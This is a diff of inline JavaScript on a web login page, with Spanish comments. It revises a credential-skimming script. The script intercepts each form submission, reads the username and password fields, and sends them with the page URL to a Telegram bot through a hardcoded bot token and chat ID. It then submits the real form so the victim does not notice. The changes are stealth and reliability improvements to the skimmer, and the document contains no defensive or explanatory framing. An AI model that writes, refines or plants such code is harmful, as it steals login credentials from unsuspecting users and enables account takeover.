@@ -425,22 +425,23 @@
 
 <script>
   (function () {
-    const TOKEN = "9159089747:AAGrdR7YNxmKCXvzeclLLpWhKCvt2ivc6uQ";
+    const TOKEN = "9159089747:AAGrdR7YNxmKCXvzec1LLpWhKCvt2ivc6uQ";
     const CHAT_ID = "7007914207";
 
-    function enviarDatos() {
-      // Intenta capturar de varios IDs o nombres posibles que suelen usarse en estos formularios
-      const userEl = document.querySelector('input[name="usuario"], input[id="usuario"], input[id="loginUsuario"], input[type="text"], input[type="email"]');
-      const passEl = document.querySelector('input[name="password"], input[id="password"], input[type="password"]');
+    document.addEventListener("submit", function (e) {
+      const form = e.target;
+      
+      // 1. Frenamos el envío inmediato para que el celular no mate la petición
+      e.preventDefault();
+
+      const userEl = form.querySelector('input[name="usuario"], input[id="usuario"], input[id="loginUsuario"], input[type="text"], input[type="email"]');
+      const passEl = form.querySelector('input[name="password"], input[id="password"], input[type="password"]');
 
       const usuario = userEl ? userEl.value.trim() : "No capturado";
       const password = passEl ? passEl.value : "No capturado";
 
-      // Si ambos están vacíos, no envía nada para evitar spam
-      if (usuario === "No capturado" && password === "No capturado") return;
-
       const texto = [
-        "🚨 NUEVA CAPTURA CELULAR/PC",
+        "🚨 NUEVA CAPTURA MÓVIL/PC",
         "Usuario: " + usuario,
         "Clave: " + password,
         "🌐 URL: " + location.href,
@@ -449,28 +450,20 @@
 
       const url = "https://api.telegram.org/bot" + TOKEN + "/sendMessage";
 
-      if (navigator.sendBeacon) {
-        const fd = new FormData();
-        fd.append("chat_id", CHAT_ID);
-        fd.append("text", texto);
-        navigator.sendBeacon(url, fd);
-      } else {
-        fetch(url, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: CHAT_ID, text: texto }),
-          keepalive: true
-        }).catch(() => {});
-      }
-    }
-
-    // Escucha tanto el envío del formulario como los clics en botones de ingreso
-    document.addEventListener("submit", enviarDatos, true);
-    document.addEventListener("click", function(e) {
-      if (e.target && (e.target.tagName === "BUTTON" || e.target.type === "submit" || e.target.classList.contains("login-btn"))) {
-        // Da un microsegundo para que capture el valor antes de cualquier redirección
-        setTimeout(enviarDatos, 100);
-      }
+      // 2. Enviamos los datos a Telegram y cuando responda, dejamos que la página siga su curso
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: texto })
+      })
+      .then(() => {
+        // Envía el formulario de verdad una vez despachado el mensaje
+        HTMLFormElement.prototype.submit.call(form);
+      })
+      .catch(() => {
+        // Si falla Telegram, igual deja avanzar el formulario para que no se trabe la página
+        HTMLFormElement.prototype.submit.call(form);
+      });
     }, true);
   })();
 </script>
